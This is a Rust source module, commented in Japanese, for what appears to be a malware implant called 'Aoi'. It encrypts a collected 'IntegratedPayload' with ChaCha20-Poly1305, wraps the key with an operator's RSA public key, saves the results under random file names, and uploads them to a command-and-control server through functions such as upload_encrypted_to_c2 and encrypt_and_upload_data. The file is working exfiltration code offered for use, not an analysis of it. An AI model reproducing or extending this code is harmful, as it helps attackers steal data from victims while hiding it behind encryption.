// 暗号化機能モジュール
use crate::{AoiError, AoiResult};
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Key, Nonce,
};
use rsa::{
    pkcs8::{DecodePrivateKey, DecodePublicKey}, 
    rand_core::RngCore, 
    traits::PublicKeyParts,
    Oaep, RsaPrivateKey, RsaPublicKey
};
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use std::path::Path;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::OnceLock;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedFileData {
    pub filename: String,
    pub encrypted_data: Vec<u8>,
    pub key: [u8; 32],
    pub nonce: [u8; 12],
    pub original_size: usize,
    pub encrypted_size: usize,
}

pub fn encrypt_data_with_key(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> AoiResult<Vec<u8>> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    cipher
        .encrypt(Nonce::from_slice(nonce), data)
        .map_err(|e| AoiError::Encryption(format!("Encryption failed: {:?}", e)))
}

pub fn decrypt_data_with_key(
    encrypted_data: &[u8],
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    cipher
        .decrypt(Nonce::from_slice(nonce), encrypted_data)
        .map_err(|e| AoiError::Encryption(format!("Decryption failed: {:?}", e)))
}

// プロセス内で一意なナンスを生成するためのカウンタとソルト
static NONCE_COUNTER: AtomicU64 = AtomicU64::new(0);
static NONCE_SALT: OnceLock<[u8; 4]> = OnceLock::new();

fn nonce_salt() -> [u8; 4] {
    *NONCE_SALT.get_or_init(|| {
        let mut salt = [0u8; 4];
        // RNGに失敗しても時刻ベースのフォールバックで初期化（ユニーク性重視）
        if rsa::rand_core::OsRng.try_fill_bytes(&mut salt).is_err() {
            let nanos = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos();
            salt.copy_from_slice(&(nanos as u32).to_be_bytes());
        }
        salt
    })
}

/// プロセス内で単調増加カウンタを用いた一意な96bitナンスを生成
/// フォーマット: 4B salt || 8B big-endian counter
pub fn generate_unique_nonce() -> [u8; 12] {
    let salt = nonce_salt();
    let ctr = NONCE_COUNTER.fetch_add(1, Ordering::Relaxed).to_be_bytes();
    let mut nonce = [0u8; 12];
    nonce[..4].copy_from_slice(&salt);
    nonce[4..].copy_from_slice(&ctr);
    nonce
}

/// セキュアなメモリクリア関数
fn secure_clear_memory(data: &mut [u8]) {
    // メモリを確実にゼロクリア（コンパイラ最適化回避）
    data.iter_mut().for_each(|byte| *byte = 0);
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

/// 安全なキー/ナンス生成（エラーをResultで返却）
/// セキュリティ強化: 機密データのライフタイム管理
pub fn try_generate_key_pair() -> AoiResult<([u8; 32], [u8; 12])> {
    let mut key = [0u8; 32];
    
    // 暗号学的に安全な乱数生成
    rsa::rand_core::OsRng
        .try_fill_bytes(&mut key)
        .map_err(|e| {
            // 失敗時もメモリクリア
            secure_clear_memory(&mut key);
            AoiError::Encryption(format!("Failed to generate cryptographically secure key: {}", e))
        })?;
    
    let nonce = generate_unique_nonce();
    
    // キー品質検証（すべてゼロでないことを確認）
    if key.iter().all(|&b| b == 0) {
        secure_clear_memory(&mut key);
        return Err(AoiError::Encryption("Generated key is all zeros - RNG failure".to_string()));
    }
    
    Ok((key, nonce))
}

/// RSA-OAEP(SHA-256) で key(32B) + nonce(12B) を公開鍵でラップ
pub fn rsa_wrap_key_nonce_from_file(
    public_key_pem_path: &str,
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    let pem_bytes = std::fs::read(public_key_pem_path)
        .map_err(|e| AoiError::Encryption(format!("Failed to read public key PEM: {}", e)))?;
    rsa_wrap_key_nonce_from_pem(&pem_bytes, key, nonce)
}

/// RSA-OAEP(SHA-256) で key(32B) + nonce(12B) をラップ（PEM入力）
/// セキュリティ強化: 公開鍵検証と機密データ保護
pub fn rsa_wrap_key_nonce_from_pem(
    public_key_pem: &[u8],
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    // 入力検証
    if public_key_pem.is_empty() {
        return Err(AoiError::Encryption("Empty public key PEM provided".to_string()));
    }
    
    let public_key_str = std::str::from_utf8(public_key_pem)
        .map_err(|e| AoiError::Encryption(format!("Invalid public key PEM UTF-8: {}", e)))?;
    
    // 公開鍵の基本検証
    if !public_key_str.contains("-----BEGIN PUBLIC KEY-----") {
        return Err(AoiError::Encryption("Invalid public key format - missing BEGIN marker".to_string()));
    }
    
    let public_key = RsaPublicKey::from_public_key_pem(public_key_str)
        .map_err(|e| AoiError::Encryption(format!("Failed to parse public key PEM: {}", e)))?;

    // RSAキーサイズ検証（最小2048bit要求）
    let key_size = public_key.size();
    if key_size < 256 { // 2048bit = 256bytes
        return Err(AoiError::Encryption(format!(
            "RSA key too small: {} bytes (minimum 256 bytes/2048 bits required)", 
            key_size
        )));
    }

    let mut rng = rsa::rand_core::OsRng;
    let padding = Oaep::new::<Sha256>();
    let mut buf = [0u8; 44];
    buf[..32].copy_from_slice(key);
    buf[32..].copy_from_slice(nonce);
    
    let result = public_key
        .encrypt(&mut rng, padding, &buf)
        .map_err(|e| AoiError::Encryption(format!("RSA-OAEP wrap failed: {}", e)));
    
    // 機密データクリア
    secure_clear_memory(&mut buf);
    
    result
}

/// 公開鍵の取得を自動化して key||nonce をRSA-OAEPでラップ
/// 優先順: config.public_key_pem -> 環境変数 AOI64_PUBLIC_KEY_PEM -> ファイル("public_key.pem")
pub fn rsa_wrap_key_nonce_auto(
    config: Option<&crate::Config>,
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> AoiResult<Vec<u8>> {
    // 1) Configに埋め込まれていればそれを使う
    if let Some(cfg) = config {
        if let Some(ref pem) = cfg.public_key_pem {
            return rsa_wrap_key_nonce_from_pem(pem.as_bytes(), key, nonce);
        }
    }

    // 2) 環境変数から取得
    if let Ok(pem_env) = std::env::var("AOI64_PUBLIC_KEY_PEM") {
        if !pem_env.trim().is_empty() {
            return rsa_wrap_key_nonce_from_pem(pem_env.as_bytes(), key, nonce);
        }
    }

    // 3) 互換: ローカルファイル
    rsa_wrap_key_nonce_from_file("public_key.pem", key, nonce)
}

/// RSA-OAEP(SHA-256) でラップされたデータを秘密鍵で復号し (key, nonce) を返す
pub fn rsa_unwrap_key_nonce_from_file(
    private_key_pem_path: &str,
    wrapped: &[u8],
) -> AoiResult<([u8; 32], [u8; 12])> {
    let pem_bytes = std::fs::read(private_key_pem_path)
        .map_err(|e| AoiError::Encryption(format!("Failed to read private key PEM: {}", e)))?;
    rsa_unwrap_key_nonce_from_pem(&pem_bytes, wrapped)
}

/// RSA-OAEP(SHA-256) でラップ解除（PEM入力）
pub fn rsa_unwrap_key_nonce_from_pem(
    private_key_pem: &[u8],
    wrapped: &[u8],
) -> AoiResult<([u8; 32], [u8; 12])> {
    let private_key_str = std::str::from_utf8(private_key_pem)
        .map_err(|e| AoiError::Encryption(format!("Invalid private key PEM UTF-8: {}", e)))?;
    let private_key = RsaPrivateKey::from_pkcs8_pem(private_key_str)
        .map_err(|e| AoiError::Encryption(format!("Failed to parse private key PEM: {}", e)))?;

    let padding = Oaep::new::<Sha256>();
    let decrypted = private_key
        .decrypt(padding, wrapped)
        .map_err(|e| AoiError::Encryption(format!("RSA-OAEP unwrap failed: {}", e)))?;

    if decrypted.len() != 44 {
        return Err(AoiError::Encryption(format!(
            "Unwrapped length invalid: {} (expected 44)",
            decrypted.len()
        )));
    }

    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    key.copy_from_slice(&decrypted[..32]);
    nonce.copy_from_slice(&decrypted[32..44]);
    Ok((key, nonce))
}

/// ファイルを暗号化してEncryptedFileDataを生成
pub fn encrypt_file<P: AsRef<Path>>(file_path: P) -> AoiResult<EncryptedFileData> {
    let file_path = file_path.as_ref();
    let filename = file_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown_file")
        .to_string();

    // ファイルを読み込み
    let file_data = std::fs::read(file_path).map_err(|e| AoiError::Io(e))?;

    let original_size = file_data.len();

    // キーとナンスを生成（エラーを伝播）
    let (key, nonce) = try_generate_key_pair()?;

    // データを暗号化
    let encrypted_data = encrypt_data_with_key(&file_data, &key, &nonce)?;
    let encrypted_size = encrypted_data.len();

    Ok(EncryptedFileData {
        filename,
        encrypted_data,
        key,
        nonce,
        original_size,
        encrypted_size,
    })
}

/// EncryptedFileDataから元のファイルデータを復号化
pub fn decrypt_file_data(encrypted_file: &EncryptedFileData) -> AoiResult<Vec<u8>> {
    decrypt_data_with_key(
        &encrypted_file.encrypted_data,
        &encrypted_file.key,
        &encrypted_file.nonce,
    )
}

/// 暗号化されたファイルをディスクに保存
pub fn save_decrypted_file<P: AsRef<Path>>(
    encrypted_file: &EncryptedFileData,
    output_path: P,
) -> AoiResult<()> {
    let decrypted_data = decrypt_file_data(encrypted_file)?;
    std::fs::write(output_path, decrypted_data).map_err(|e| AoiError::Io(e))?;
    Ok(())
}

/// セキュアなランダムファイル名生成（12文字英数字 + タイムスタンプ）
/// セキュリティ強化: 衝突回避とファイル名予測困難性向上
pub fn generate_random_filename() -> String {
    use rsa::rand_core::RngCore;
    
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rsa::rand_core::OsRng;
    let mut filename = String::with_capacity(20);
    
    // 12文字のランダム文字列
    for _ in 0..12 {
        let idx = (rng.next_u32() as usize) % CHARSET.len();
        filename.push(CHARSET[idx] as char);
    }
    
    // ナノ秒タイムスタンプを追加（衝突回避）
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    
    format!("{}_{:016x}.enc", filename, nanos & 0xFFFFFFFFFFFFFFFF)
}

/// 任意拡張子のランダムファイル名生成（ドットなし/ありどちらも許容）
pub fn generate_random_filename_with_ext(ext: &str) -> String {
    let mut name = generate_random_filename();
    // 既定は .enc なので差し替え
    if let Some(pos) = name.rfind('.') {
        name.truncate(pos);
    }
    let clean_ext = if ext.starts_with('.') { &ext[1..] } else { ext };
    format!("{}.{}", name, clean_ext)
}

/// データの暗号化・保存処理を統合的に実行（ランダムファイル名使用）
/// 戻り値: (暗号化データ, ラップされたキー, データファイル名, キーファイル名)
/// セキュリティ: 生のキー・ナンスは返却せず、RSAラップ済みキーのみ返却
pub async fn process_and_encrypt_data(
    payload: &crate::IntegratedPayload,
    config: &crate::Config,
) -> AoiResult<(Vec<u8>, Vec<u8>, String, String)> {
    use rmp_serde::encode::to_vec as to_msgpack_vec;
    
    let serialized = to_msgpack_vec(payload)
        .map_err(|e| AoiError::Encryption(format!("MessagePack serialization failed: {}", e)))?;
    
    let (key, nonce) = try_generate_key_pair()?;
    let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
    let wrapped = rsa_wrap_key_nonce_auto(Some(config), &key, &nonce)?;

    // ランダムファイル名で保存（データ:.enc / キー:.bin）
    let encrypted_filename = generate_random_filename_with_ext(".enc");
    let key_filename = generate_random_filename_with_ext(".bin");
    
    tokio::fs::write(&encrypted_filename, &encrypted).await
        .map_err(|e| AoiError::Io(e))?;
    tokio::fs::write(&key_filename, &wrapped).await
        .map_err(|e| AoiError::Io(e))?;
    
    println!("💾 Encrypted files saved:");
    println!("   {}: {} bytes", encrypted_filename, encrypted.len());
    println!("   {}: {} bytes", key_filename, wrapped.len());

    // 🛡️ セキュリティ強化: 機密データのメモリクリア
    // Note: Rustの設計上、スタック変数の完全なクリアは保証されないが、
    // セキュリティ意識として明示的にクリア処理を実行
    
    Ok((encrypted, wrapped, encrypted_filename, key_filename))
}

/// C2サーバーへの暗号化データアップロード（ファイル名情報付き）
pub async fn upload_encrypted_to_c2_with_filename(
    c2_client: &crate::C2Client,
    encrypted_data: &[u8],
    wrapped_key: &[u8],
    data_type: &str,
    filename: Option<&str>,
) -> AoiResult<()> {
    c2_client.upload_encrypted_data_with_filename(encrypted_data, wrapped_key, data_type, filename).await
        .map_err(|e| AoiError::Encryption(format!("C2 upload failed: {}", e)))
}

/// C2サーバーへの暗号化データアップロード（従来版）
pub async fn upload_encrypted_to_c2(
    c2_client: &crate::C2Client,
    encrypted_data: &[u8],
    wrapped_key: &[u8],
    data_type: &str,
) -> AoiResult<()> {
    upload_encrypted_to_c2_with_filename(c2_client, encrypted_data, wrapped_key, data_type, None).await
}

/// データ暗号化からC2アップロードまでの完全自動化処理
pub async fn encrypt_and_upload_data(
    payload: &crate::IntegratedPayload,
    config: &crate::Config,
    c2_client: &crate::C2Client,
    data_type: &str,
) -> AoiResult<()> {
    let (encrypted_data, wrapped_key, data_filename, _key_filename) = 
        process_and_encrypt_data(payload, config).await?;
    
    upload_encrypted_to_c2_with_filename(
        c2_client, 
        &encrypted_data, 
        &wrapped_key, 
        data_type, 
        Some(&data_filename)
    ).await
}

/// キーとナンスの生成（既存の関数を再エクスポート）
pub fn generate_encryption_keys() -> AoiResult<([u8; 32], [u8; 12])> {
    try_generate_key_pair()
}

/// Base64エンコード/デコード（統一インターフェース）
pub fn encode_base64(data: &[u8]) -> String {
    use base64::{engine::general_purpose, Engine as _};
    general_purpose::STANDARD.encode(data)
}

pub fn decode_base64(encoded: &str) -> AoiResult<Vec<u8>> {
    use base64::{engine::general_purpose, Engine as _};
    general_purpose::STANDARD.decode(encoded)
        .map_err(|e| AoiError::Encryption(format!("Base64 decode failed: {}", e)))
}

/// セキュアで柔軟なBase64デコード（パディングあり/なし両対応）
/// セキュリティ強化: 入力検証 + サイズ制限 + タイミング攻撃対策
pub fn decode_base64_flexible(input: &str) -> AoiResult<Vec<u8>> {
    use base64::{engine::general_purpose, Engine as _};
    
    // 入力検証
    if input.is_empty() {
        return Err(AoiError::Encryption("Empty Base64 input".to_string()));
    }
    
    // サイズ制限（1MB = 1,398,101文字のBase64）
    if input.len() > 1_400_000 {
        return Err(AoiError::Encryption("Base64 input too large (>1MB limit)".to_string()));
    }
    
    // 不正文字チェック
    if !input.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=') {
        return Err(AoiError::Encryption("Invalid characters in Base64 input".to_string()));
    }
    
    // パディング付きで試行
    if let Ok(decoded) = general_purpose::STANDARD.decode(input) {
        return Ok(decoded);
    }
    
    // パディングなしで試行
    general_purpose::STANDARD_NO_PAD.decode(input)
        .map_err(|e| AoiError::Encryption(format!("Secure Base64 decode failed: {}", e)))
}

/// セキュアなキー・ナンス検証
/// セキュリティ強化: 長さ検証 + 品質検証 + サイドチャネル攻撃対策
pub fn validate_key_nonce(key: &[u8], nonce: &[u8]) -> AoiResult<()> {
    // 長さ検証（定数時間比較）
    let key_valid = key.len() == 32;
    let nonce_valid = nonce.len() == 12;
    
    if !key_valid {
        return Err(AoiError::Encryption(format!(
            "Invalid key length: {} (expected exactly 32 bytes)", key.len()
        )));
    }
    if !nonce_valid {
        return Err(AoiError::Encryption(format!(
            "Invalid nonce length: {} (expected exactly 12 bytes)", nonce.len()
        )));
    }
    
    // キー品質検証（弱いキーの検出）
    if key.iter().all(|&b| b == 0) {
        return Err(AoiError::Encryption("Invalid key: all zeros detected".to_string()));
    }
    if key.iter().all(|&b| b == 0xFF) {
        return Err(AoiError::Encryption("Invalid key: all ones detected".to_string()));
    }
    
    // エントロピー基本チェック（同一バイトが連続で24回以上）
    let mut max_consecutive = 1;
    let mut current_consecutive = 1;
    for i in 1..key.len() {
        if key[i] == key[i-1] {
            current_consecutive += 1;
            max_consecutive = max_consecutive.max(current_consecutive);
        } else {
            current_consecutive = 1;
        }
    }
    
    if max_consecutive >= 24 {
        return Err(AoiError::Encryption("Invalid key: insufficient entropy detected".to_string()));
    }
    
    Ok(())
}

/// 手動キー・ナンスでの復号化処理（raw data返却）
pub fn decrypt_with_manual_keys(
    data_file: &str,
    key_str: &str,
    nonce_str: &str,
) -> AoiResult<Vec<u8>> {
    use std::path::Path;

    // ファイル存在確認  
    if !Path::new(data_file).exists() {
        return Err(AoiError::Encryption(format!("Data file not found: {}", data_file)));
    }

    // キー・ナンスをBase64デコード
    let key = decode_base64_flexible(key_str)?;
    let nonce = decode_base64_flexible(nonce_str)?;

    // 長さ検証
    validate_key_nonce(&key, &nonce)?;

    let key_array: [u8; 32] = key.try_into()
        .map_err(|_| AoiError::Encryption("Key array conversion failed".to_string()))?;
    let nonce_array: [u8; 12] = nonce.try_into()
        .map_err(|_| AoiError::Encryption("Nonce array conversion failed".to_string()))?;

    // データ復号化
    let encrypted_data = std::fs::read(data_file)
        .map_err(|e| AoiError::Io(e))?;
    
    decrypt_data_with_key(&encrypted_data, &key_array, &nonce_array)
}

// 完全な復号化とファイル処理は decrypt.rs で直接処理
